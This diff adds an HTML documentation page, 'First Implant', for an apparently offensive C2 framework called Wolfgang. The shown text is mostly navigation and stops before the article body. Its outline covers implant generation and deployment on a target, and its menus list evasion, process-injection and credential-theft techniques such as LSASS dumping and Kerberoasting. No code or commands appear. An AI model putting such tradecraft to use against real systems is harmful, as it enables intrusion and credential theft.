@@ -1,0 +1,1878 @@
+
+<!DOCTYPE html>
+
+<html class="no-js" lang="pt">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<meta content="Comprehensive documentation for the Wolfgang C2 Framework" name="description"/>
+<link href="../quickstart/" rel="prev"/>
+<link href="../first-operation/" rel="next"/>
+<link href="./" hreflang="pt-BR" rel="alternate"/>
+<link href="../../en/getting-started/first-implant/" hreflang="en" rel="alternate"/>
+<link href="../../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.6.1, mkdocs-material-9.7.5" name="generator"/>
+<title>First Implant - Wolfgang C2 Framework</title>
+<link href="../../assets/stylesheets/main.484c7ddc.min.css" rel="stylesheet"/>
+<link href="../../assets/stylesheets/palette.ab4e12ef.min.css" rel="stylesheet"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
+<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+<script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body data-md-color-accent="purple" data-md-color-primary="deep-purple" data-md-color-scheme="slate" dir="ltr">
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#primeiro-implant">
+          Pular para conteúdo
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header" data-md-component="header">
+<nav aria-label="Cabeçalho" class="md-header__inner md-grid">
+<a aria-label="Wolfgang C2 Framework" class="md-header__button md-logo" data-md-component="logo" href="../.." title="Wolfgang C2 Framework">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            Wolfgang C2 Framework
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              First Implant
+            
+          </span>
+</div>
+</div>
+</div>
+<form class="md-header__option" data-md-component="palette">
+<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="purple" data-md-color-media="" data-md-color-primary="deep-purple" data-md-color-scheme="slate" id="__palette_0" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+</label>
+<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="purple" data-md-color-media="" data-md-color-primary="deep-purple" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_0" hidden="" title="Switch to dark mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+</label>
+</form>
+<script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+<div class="md-header__option">
+<div class="md-select">
+<button aria-label="Selecione o idioma" class="md-header__button md-icon">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"></path></svg>
+</button>
+<div class="md-select__inner">
+<ul class="md-select__list">
+<li class="md-select__item">
+<a class="md-select__link" href="./" hreflang="pt-BR">
+              Português
+            </a>
+</li>
+<li class="md-select__item">
+<a class="md-select__link" href="../../en/getting-started/first-implant/" hreflang="en">
+              English
+            </a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="Buscar" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Buscar" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+</label>
+<nav aria-label="Pesquisar" class="md-search__options">
+<button aria-label="Limpar" class="md-search__icon md-icon" tabindex="-1" title="Limpar" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+</button>
+</nav>
+<div class="md-search__suggest" data-md-component="search-suggest"></div>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="" tabindex="0">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            Inicializando busca
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<nav aria-label="Abas" class="md-tabs" data-md-component="tabs">
+<div class="md-grid">
+<ul class="md-tabs__list">
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../..">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+</li>
+<li class="md-tabs__item md-tabs__item--active">
+<a class="md-tabs__link" href="../">
+          
+  
+  
+    
+  
+  Getting Started
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../operator-guide/">
+          
+  
+  
+    
+  
+  Operator Guide
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../architecture/">
+          
+  
+  
+    
+  
+  Architecture
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../developer-guide/">
+          
+  
+  
+    
+  
+  Developer Guide
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../tradecraft/">
+          
+  
+  
+    
+  
+  Tradecraft
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../modules/">
+          
+  
+  
+    
+  
+  Module Catalog
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../api/">
+          
+  
+  
+    
+  
+  API Reference
+
+        </a>
+</li>
+</ul>
+</div>
+</nav>
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Navegação" class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="Wolfgang C2 Framework" class="md-nav__button md-logo" data-md-component="logo" href="../.." title="Wolfgang C2 Framework">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+    Wolfgang C2 Framework
+  </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../..">
+<span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../">
+<span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="true" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_2">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Getting Started
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../quickstart/">
+<span class="md-ellipsis">
+    
+  
+    Quickstart
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+<span class="md-ellipsis">
+    
+  
+    First Implant
+  
+
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="./">
+<span class="md-ellipsis">
+    
+  
+    First Implant
+  
+
+    
+  </span>
+</a>
+<nav aria-label="Índice" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Índice
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#1-criar-um-listener-https">
+<span class="md-ellipsis">
+      
+        1. Criar um Listener HTTPS
+      
+    </span>
+</a>
+<nav aria-label="1. Criar um Listener HTTPS" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#via-repl-interativo">
+<span class="md-ellipsis">
+      
+        Via REPL interativo
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#verificar-listeners-ativos">
+<span class="md-ellipsis">
+      
+        Verificar listeners ativos
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#tipos-de-listener-suportados">
+<span class="md-ellipsis">
+      
+        Tipos de listener suportados
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#2-gerar-o-implant">
+<span class="md-ellipsis">
+      
+        2. Gerar o Implant
+      
+    </span>
+</a>
+<nav aria-label="2. Gerar o Implant" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#via-cli-do-servidor-direto">
+<span class="md-ellipsis">
+      
+        Via CLI do servidor (direto)
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#via-repl-do-client">
+<span class="md-ellipsis">
+      
+        Via REPL do client
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#parametros-de-generate">
+<span class="md-ellipsis">
+      
+        Parametros de generate
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#o-que-e-embutido-no-implant">
+<span class="md-ellipsis">
+      
+        O que e embutido no implant
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#3-executar-no-alvo">
+<span class="md-ellipsis">
+      
+        3. Executar no Alvo
+      
+    </span>
+</a>
+<nav aria-label="3. Executar no Alvo" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#fases-de-inicializacao-do-implant">
+<span class="md-ellipsis">
+      
+        Fases de inicializacao do implant
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#4-registro-do-agent">
+<span class="md-ellipsis">
+      
+        4. Registro do Agent
+      
+    </span>
+</a>
+<nav aria-label="4. Registro do Agent" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#detalhes-do-key-exchange">
+<span class="md-ellipsis">
+      
+        Detalhes do key exchange
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#envelope-de-comunicacao">
+<span class="md-ellipsis">
+      
+        Envelope de comunicacao
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#retentativas-de-registro">
+<span class="md-ellipsis">
+      
+        Retentativas de registro
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#5-verificar-o-agent">
+<span class="md-ellipsis">
+      
+        5. Verificar o Agent
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#troubleshooting">
+<span class="md-ellipsis">
+      
+        Troubleshooting
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#veja-tambem">
+<span class="md-ellipsis">
+      
+        Veja tambem
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../first-operation/">
+<span class="md-ellipsis">
+    
+  
+    First Operation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../next-steps/">
+<span class="md-ellipsis">
+    
+  
+    Next Steps
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../operator-guide/">
+<span class="md-ellipsis">
+    
+  
+    Operator Guide
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_3">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Operator Guide
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/server-setup/">
+<span class="md-ellipsis">
+    
+  
+    Server Setup
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/listeners/">
+<span class="md-ellipsis">
+    
+  
+    Listeners
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/implant-generation/">
+<span class="md-ellipsis">
+    
+  
+    Implant Generation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/cli-reference/">
+<span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/agent-management/">
+<span class="md-ellipsis">
+    
+  
+    Agent Management
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/task-system/">
+<span class="md-ellipsis">
+    
+  
+    Task System
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/modules/">
+<span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/exfiltration/">
+<span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/redirectors/">
+<span class="md-ellipsis">
+    
+  
+    Redirectors
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/plugins/">
+<span class="md-ellipsis">
+    
+  
+    Plugins
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../architecture/">
+<span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_4">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Architecture
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/overview/">
+<span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/protocol/">
+<span class="md-ellipsis">
+    
+  
+    Protocol
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/crypto/">
+<span class="md-ellipsis">
+    
+  
+    Cryptography
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/transport/">
+<span class="md-ellipsis">
+    
+  
+    Transport
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/modules/">
+<span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/storage/">
+<span class="md-ellipsis">
+    
+  
+    Storage
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/auth/">
+<span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/plugins/">
+<span class="md-ellipsis">
+    
+  
+    Plugins
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/implant-internals/">
+<span class="md-ellipsis">
+    
+  
+    Implant Internals
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../developer-guide/">
+<span class="md-ellipsis">
+    
+  
+    Developer Guide
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_5_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_5">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Developer Guide
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/project-structure/">
+<span class="md-ellipsis">
+    
+  
+    Project Structure
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/adding-modules/">
+<span class="md-ellipsis">
+    
+  
+    Adding Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/adding-transports/">
+<span class="md-ellipsis">
+    
+  
+    Adding Transports
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/plugin-sdk/">
+<span class="md-ellipsis">
+    
+  
+    Plugin SDK
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/testing/">
+<span class="md-ellipsis">
+    
+  
+    Testing
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/build-system/">
+<span class="md-ellipsis">
+    
+  
+    Build System
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/">
+<span class="md-ellipsis">
+    
+  
+    Tradecraft
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_6">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Tradecraft
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/evasion/">
+<span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_2">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Evasion
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/amsi-bypass/">
+<span class="md-ellipsis">
+    
+  
+    AMSI Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/etw-bypass/">
+<span class="md-ellipsis">
+    
+  
+    ETW Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/sandbox-detection/">
+<span class="md-ellipsis">
+    
+  
+    Sandbox Detection
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/sleep-obfuscation/">
+<span class="md-ellipsis">
+    
+  
+    Sleep Obfuscation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/direct-syscalls/">
+<span class="md-ellipsis">
+    
+  
+    Direct Syscalls
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/memory-encryption/">
+<span class="md-ellipsis">
+    
+  
+    Memory Encryption
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/hwbp-bypass/">
+<span class="md-ellipsis">
+    
+  
+    HWBP Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/injection/">
+<span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_3_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_3">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Injection
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/process-hollowing/">
+<span class="md-ellipsis">
+    
+  
+    Process Hollowing
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/earlybird-apc/">
+<span class="md-ellipsis">
+    
+  
+    EarlyBird APC
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/module-stomping/">
+<span class="md-ellipsis">
+    
+  
+    Module Stomping
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/reflective-loading/">
+<span class="md-ellipsis">
+    
+  
+    Reflective Loading
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/credential-access/">
+<span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_4_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_4">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Credential Access
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/lsass-dumping/">
+<span class="md-ellipsis">
+    
+  
+    LSASS Dumping
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/registry-hives/">
+<span class="md-ellipsis">
+    
+  
+    Registry Hives
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/kerberoasting/">
+<span class="md-ellipsis">
+    
+  
+    Kerberoasting
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/vault-extraction/">
+<span class="md-ellipsis">
+    
+  
+    Vault Extraction
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
